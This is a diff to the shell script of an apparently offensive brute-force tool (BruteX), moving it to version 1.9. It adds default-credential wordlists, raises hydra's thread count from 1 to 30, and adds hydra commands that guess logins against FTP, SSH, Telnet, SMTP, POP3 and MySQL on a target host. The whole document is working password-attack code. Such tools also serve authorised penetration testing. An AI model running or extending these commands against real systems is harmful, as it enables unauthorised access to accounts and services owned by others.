@@ -17,11 +17,23 @@
 
 TARGET="$1"
 PORT="$2"
-VER="1.8"
+VER="1.9"
 LOOT_DIR=/usr/share/brutex/loot
 FTP_USER_PASS="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
+FTP_USERS="/usr/share/brutex/wordlists/ftp_defuser.lst"
+FTP_PASS="/usr/share/brutex/wordlists/ftp_defpass.lst"
 SSH_USER_PASS="/usr/share/brutex/wordlists/ssh-default-userpass.txt"
+SSH_USERS="/usr/share/brutex/wordlists/ssh_defuser.lst"
+SSH_PASS="/usr/share/brutex/wordlists/ssh_defpass.lst"
+SMTP_USERS="/usr/share/brutex/wordlists/smtp_defuser.lst"
+SMTP_PASS="/usr/share/brutex/wordlists/smtp_defpass.lst"
+POP_USERS="/usr/share/brutex/wordlists/pop_defusers.lst"
+POP_PASS="/usr/share/brutex/wordlists/pop_defpass.lst"
 TELNET_USER_PASS="/usr/share/brutex/wordlists/telnet-default-userpass.txt"
+TELNET_USERS="/usr/share/brutex/wordlists/telnet_defuser.lst"
+TELNET_PASS="/usr/share/brutex/wordlists/telnet_defpass.lst"
+SQL_USERS="/usr/share/brutex/wordlists/sql_defuser.lst"
+SQL_PASS="/usr/share/brutex/wordlists/sql_defpass.lst"
 MSSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
 MYSQL_USER_PASS="/usr/share/brutex/wordlists/mysql-default-userpass.txt"
 ORACLE_USER_PASS="/usr/share/brutex/wordlists/oracle-default-userpass.txt"
@@ -33,7 +45,7 @@ PASS_FILE="/usr/share/brutex/wordlists/password.lst"
 SNMP_FILE="/usr/share/brutex/wordlists/snmp-strings.txt"
 VNC_FILE="/usr/share/brutex/wordlists/vnc-default-passwords.txt"
 HTTP_LOCATION="/"
-THREADS="1"
+THREADS="30"
 COLOR1='\033[91m'
 COLOR2='\033[92m'
 COLOR3='\033[92m'
@@ -113,6 +125,7 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 21 opened... running tests...$RESET"	
 	hydra -C $FTP_USER_PASS $TARGET ftp -t $THREADS -e ns
+	hydra -L $FTP_USERS -P $FTP_PASS $TARGET ftp -t $THREADS -e ns
 fi
 
 if [ -z "$port_22" ]
@@ -122,6 +135,7 @@ else
 	echo -e "$COLOR2 + -- --=[Port 22 opened... running tests...$RESET"
 	hydra -C $SSH_USER_PASS $TARGET ssh -t $THREADS -e ns
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS -e ns
+	hydra -L $SSH_USERS -P $SSH_PASS $TARGET ssh -t $THREADS -e ns
 fi
 
 if [ -z "$port_23" ]
@@ -131,6 +145,7 @@ else
 	echo -e "$COLOR2 + -- --=[Port 23 opened... running tests...$RESET"
 	hydra -C $TELNET_USER_PASS $TARGET telnet -t $THREADS -e ns
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS -e ns
+	hydra -L $TELNET_USERS -P $TELNET_PASS $TARGET telnet -t $THREADS -e ns
 fi
 
 if [ -z "$port_25" ]
@@ -140,6 +155,7 @@ else
 	echo -e "$COLOR2 + -- --=[Port 25 opened... running tests...$RESET"
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp-enum -t $THREADS -e ns
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -t $THREADS -e ns
+	hydra -L $SMTP_USERS -P $SMTP_PASS $TARGET smtp -t $THREADS -e ns
 fi
 
 if [ -z "$port_80" ]
@@ -156,6 +172,7 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 110 opened... running tests...$RESET"	
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -t $THREADS -e ns
+	hydra -L $POP_USERS -P $POP_PASS $TARGET pop3 -t $THREADS -e ns
 fi
 
 if [ -z "$port_139" ]
@@ -255,6 +272,7 @@ then
 else
 	echo -e "$COLOR2 + -- --=[Port 3306 opened... running tests...$RESET"
 	hydra -C $MYSQL_USER_PASS $TARGET mysql -t $THREADS -e ns
+	hydra -L $SQL_USERS -P $SQL_PASS $TARGET mysql -t $THREADS -e ns
 fi
 
 if [ -z "$port_3389" ]
